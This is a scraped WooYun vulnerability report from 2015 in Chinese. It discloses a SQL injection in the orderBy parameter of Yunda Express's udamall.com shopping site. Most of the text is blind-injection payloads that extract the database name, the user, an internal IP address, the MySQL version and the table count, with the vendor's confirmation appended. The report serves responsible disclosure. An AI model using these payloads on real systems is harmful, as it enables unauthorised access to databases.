{"id": 11723, "wybug_id": "wooyun-2015-0120383", "wybug_title": "韵达快递旗下跨境电商平台SQL注入漏洞", "wybug_corp": "韵达快递", "wybug_author": "harbour_bin", "wybug_date": "2015-06-14 11:09", "wybug_open_date": "2015-07-30 10:08", "wybug_type": "", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向公众公开  简要描述： 韵达快递旗下跨境电商平台SQL注入漏洞 详细说明：  \nURL：http://www.udamall.com/cn/index.php/gallery-ajax_get_goods.htmlPOST：brand_id[]=153&orderBy=buy_w_count desc&showtype=grid&gTag[]=15&page=1注入点:orderBy\n\nbrand_id[]=153&orderBy=buy_w_count  and 1=1 desc&showtype=grid&gTag[]=15&page=1brand_id[]=153&orderBy=buy_w_count  and 1=2 desc&showtype=grid&gTag[]=15&page=1\n\n猜解数据库名brand_id[]=153&orderBy=buy_w_count  and length(database())=7 desc&showtype=grid&gTag[]=15&page=1brand_id[]=153&orderBy=buy_w_count  and substring(database(),1,1)=char(117) desc&showtype=grid&gTag[]=15&page=1 ubrand_id[]=153&orderBy=buy_w_count  and substring(database(),2,1)=char(100) desc&showtype=grid&gTag[]=15&page=1dbrand_id[]=153&orderBy=buy_w_count  and substring(database(),3,1)=char(97) desc&showtype=grid&gTag[]=15&page=1abrand_id[]=153&orderBy=buy_w_count  and left(database(),7)=char(117,100,97,109,97,108,108) desc&showtype=grid&gTag[]=15&page=1数据库名: udamall\n\n猜用户名brand_id[]=153&orderBy=buy_w_count  and length(user())=17 desc&showtype=grid&gTag[]=15&page=1brand_id[]=153&orderBy=buy_w_count  and substring(user(),1,1)=char(117) desc&showtype=grid&gTag[]=15&page=1ubrand_id[]=153&orderBy=buy_w_count  and left(user(),7)=char(117,100,97,109,97,108,108) desc&showtype=grid&gTag[]=15&page=1udamallbrand_id[]=153&orderBy=buy_w_count  and substring(user(),8,1)=char(64) desc&showtype=grid&gTag[]=15&page=1@brand_id[]=153&orderBy=buy_w_count  and substring(user(),9,1)=char(49) desc&showtype=grid&gTag[]=15&page=11brand_id[]=153&orderBy=buy_w_count  and substring(user(),10,1)=char(48) desc&showtype=grid&gTag[]=15&page=10brand_id[]=153&orderBy=buy_w_count  and substring(user(),11,1)=char(46) desc&showtype=grid&gTag[]=15&page=1.brand_id[]=153&orderBy=buy_w_count  and substring(user(),12,1)=char(48) desc&showtype=grid&gTag[]=15&page=10brand_id[]=153&orderBy=buy_w_count  and substring(user(),13,1)=char(46) desc&showtype=grid&gTag[]=15&page=1.brand_id[]=153&orderBy=buy_w_count  and substring(user(),14,1)=char(50) desc&showtype=grid&gTag[]=15&page=12brand_id[]=153&orderBy=buy_w_count  and substring(user(),15,1)=char(46) desc&showtype=grid&gTag[]=15&page=1.brand_id[]=153&orderBy=buy_w_count  and substring(user(),16,1)=char(52) desc&showtype=grid&gTag[]=15&page=14brand_id[]=153&orderBy=buy_w_count  and substring(user(),17,1)=char(50) desc&showtype=grid&gTag[]=15&page=12用户名:udamall@10.0.1.42\n\nbrand_id[]=153&orderBy=buy_w_count  and left(version(),3)=char(53,46,54) desc&showtype=grid&gTag[]=15&page=1版本:5.6\n\nbrand_id[]=153&orderBy=buy_w_count and (select count(1) from information_schema.tables)=408 desc&showtype=grid&gTag[]=15&page=1408个表\n   漏洞证明：  \n数据库名：udamall用户名:udamall@10.0.1.42版本号：Mysql5.6表数:408个\n\n修改substring(database(),1,1)为if(substring(database(),1,1),sleep(2),0)可以执行,本想根据这个编写Python脚本,水平有限,出问题了,就不贴出来了\n部分图片证明:\n\n\n\n\n\n\n\n   修复方案：  你们更专业！   版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-15 10:06 厂商回复： 感谢指出，我们会尽快修复，辛苦了 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}